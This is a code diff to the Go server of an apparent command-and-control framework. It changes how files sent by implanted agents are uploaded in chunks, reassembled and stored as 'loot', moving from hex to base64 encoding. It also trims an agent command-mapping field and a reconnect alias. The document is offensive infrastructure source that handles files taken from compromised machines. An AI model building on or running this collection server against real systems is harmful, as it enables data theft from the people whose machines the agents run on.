@@ -11,6 +11,7 @@ import (
 	"crypto/x509"
 	"crypto/x509/pkix"
 	"database/sql"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"encoding/pem"
@@ -60,11 +61,10 @@ type Listener struct {
 }
 
 type AgentHandler struct {
-	ID                string            `json:"id"`
-	AgentName         string            `json:"agentName"`
-	AgentHeaderID     string            `json:"agentHttpHeaderId"`
-	SupportedCommands []string          `json:"supportedCommands"`
-	CommandMappings   map[string]string `json:"commandMappings"`
+	ID                string   `json:"id"`
+	AgentName         string   `json:"agentName"`
+	AgentHeaderID     string   `json:"agentHttpHeaderId"`
+	SupportedCommands []string `json:"supportedCommands"`
 }
 
 type AgentRegistration struct {
@@ -1294,8 +1294,8 @@ func handleCommandResponse(w http.ResponseWriter, r *http.Request) {
 	if agentID != "" && response.Status == "completed" {
 		var command string
 		if err := db.QueryRow("SELECT command FROM commands WHERE id = ?", response.CommandID).Scan(&command); err == nil {
-			// Check if command is "reconnect" or "8" (translated)
-			if strings.HasPrefix(command, "reconnect ") || strings.HasPrefix(command, "8 ") {
+			// Check if command is "reconnect"
+			if strings.HasPrefix(command, "reconnect ") {
 				// Parse the new interval from the output
 				// Expected format: "Reconnect interval changed from X to Y seconds"
 				if strings.Contains(response.Output, "changed from") && strings.Contains(response.Output, "to") {
@@ -1349,7 +1349,7 @@ type ChunkInitRequest struct {
 type ChunkUploadRequest struct {
 	SessionID  string `json:"sessionId"`
 	ChunkIndex int    `json:"chunkIndex"`
-	ChunkData  string `json:"chunkData"` // hex-encoded
+	ChunkData  string `json:"chunkData"`
 	ChunkMD5   string `json:"chunkMd5"`
 }
 
@@ -1406,10 +1406,9 @@ func handleChunkUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Decode hex data
-	chunkData, err := hex.DecodeString(req.ChunkData)
+	chunkData, err := base64.StdEncoding.DecodeString(req.ChunkData)
 	if err != nil {
-		http.Error(w, "Invalid hex data", http.StatusBadRequest)
+		http.Error(w, "Invalid base64 data", http.StatusBadRequest)
 		return
 	}
 
@@ -1422,11 +1421,11 @@ func handleChunkUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Store chunk
+	// Store chunk as base64 (keep it encoded for storage)
 	_, err = db.Exec(`
 		INSERT INTO temp_file_chunks (session_id, chunk_index, chunk_data, chunk_md5, received_at)
 		VALUES (?, ?, ?, ?, ?)
-	`, req.SessionID, req.ChunkIndex, chunkData, req.ChunkMD5, time.Now())
+	`, req.SessionID, req.ChunkIndex, req.ChunkData, req.ChunkMD5, time.Now())
 
 	if err != nil {
 		log.Printf("Error storing chunk: %v", err)
@@ -1505,10 +1504,16 @@ func handleChunkComplete(w http.ResponseWriter, r *http.Request) {
 
 	var fileContent []byte
 	for rows.Next() {
-		var chunkData []byte
-		if err := rows.Scan(&chunkData); err != nil {
+		var chunkDataBase64 string
+		if err := rows.Scan(&chunkDataBase64); err != nil {
 			log.Printf("Error scanning chunk: %v", err)
 			http.Error(w, "Failed to read chunk", http.StatusInternalServerError)
+			return
+		}
+		chunkData, err := base64.StdEncoding.DecodeString(chunkDataBase64)
+		if err != nil {
+			log.Printf("Error decoding chunk: %v", err)
+			http.Error(w, "Failed to decode chunk", http.StatusInternalServerError)
 			return
 		}
 		fileContent = append(fileContent, chunkData...)
@@ -1523,8 +1528,11 @@ func handleChunkComplete(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Re-encode the complete file as base64 for storage
+	base64Content := base64.StdEncoding.EncodeToString(fileContent)
+
 	// Store in loot_files
-	err = storeLootFile(agentID, filename, originalPath, string(fileContent), finalMD5, "file", commandID)
+	err = storeLootFile(agentID, filename, originalPath, base64Content, finalMD5, "file", commandID)
 	if err != nil {
 		log.Printf("Error storing loot file: %v", err)
 		http.Error(w, "Failed to store file", http.StatusInternalServerError)
